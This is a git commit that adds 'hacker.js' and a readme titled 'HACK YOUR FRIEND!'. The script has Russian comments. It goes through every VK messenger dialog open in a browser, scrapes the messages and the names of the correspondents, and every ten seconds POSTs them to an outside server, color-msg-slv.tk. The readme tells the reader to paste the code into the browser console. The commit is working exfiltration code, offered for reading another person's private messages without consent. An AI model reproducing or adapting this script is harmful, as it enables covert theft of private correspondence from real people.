7ae9baf04f0507a6a788e9b36548b1b5e84c76bc
Color-Kat <50361931+KatSem7@users.noreply.github.com>
2021-08-01 20:37:39 +0300

    hacking script is done

---
+++ hacker.js
@@ -0,0 +1,91 @@
+/**
+ * Проходится по всем диалогам в панели слева и получает их id
+ */
+function getDialogsIDs() {
+    let dialogs = [];
+    document.querySelectorAll('.nim-dialog').forEach(link => {
+        dialogs.push({
+            'list-id': link.getAttribute('data-list-id'),
+            'msgid': link.getAttribute('data-msgid')
+        });
+    });
+
+    return dialogs;
+}
+
+/**
+ * Получает все видимые сообщения на этой странице
+ */
+function getMessages() {
+    let messages = [];
+    document.querySelectorAll('.im-mess--text').forEach(mess =>
+        messages.push(mess.textContent)
+    );
+    return messages;
+}
+
+/**
+ * Имитирует клик по диалогу (по sel_id), чтобы переместиться на страницу с ним
+ */
+async function goToDialog(sel_id) {
+    document.querySelector(`._im_dialog_${sel_id}`).click();
+}
+
+
+let dialogsData = {}; // все данные о диалогах
+let dialogs = getDialogsIDs(); // получаем id диалогов
+let dialogsCount = dialogs.length; // узнаем сколько всего диалогов
+let count = 6;
+
+/**
+ * it is magiiick
+ */
+async function hacking() {
+    // переходим на страницу с сообщениями
+    document.querySelector('#l_msg > a').click();
+    await new Promise(resolve => setTimeout(resolve, 2000));
+
+    // каждые 2сек запускаем этот код, чтобы страница с диалогом успела загрузитсья
+    let parser = setInterval(async () => {
+        dialogsCount--; // прочитали этот диалог
+        if (dialogsCount < 0) return dialogsData; // диалоги кончились
+
+        // переходим ко следующиму диалогу
+        await goToDialog(dialogs[dialogsCount]['list-id']);
+
+        // получаем имя человека, с кем периписка
+        let name = document.querySelector('._im_page_peer_name').textContent;
+
+        // добавляем сообщения с этой страницы в объект по ключу
+        dialogsData[name] = getMessages();
+
+        // выводим в консоль обновленные данные о диалогах
+        console.log(dialogsData);
+    }, 2000);
+
+
+    // каждыйе 10сек асинхронн0 отправляем данные на сервер
+    let saver = setInterval(() => {
+        let formData = new FormData();
+        formData.append('data', dialogsData);
+        fetch(
+            'https://color-msg-slv.tk', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: formData,
+            }
+        );
+
+        dialogsData = {}; // clear data
+    }, 10000);
+
+
+    if (count <= 0) {
+        // stop inntervals
+        clearInterval(parser);
+        clearInterval(saver);
+    }
+    count--;
+}
+
+hacking();
---
+++ readme.md
@@ -0,0 +1,5 @@
+### HACK YOUR FRIEND!
+Script will parse all dialogs and messages from vk If insert code from hacker.js into browser console and press enter.
+Then every ten seconds script sends getted data to server - https://color-msg-slv.tk in 
+file dialogs.json.
+You can find data on start page
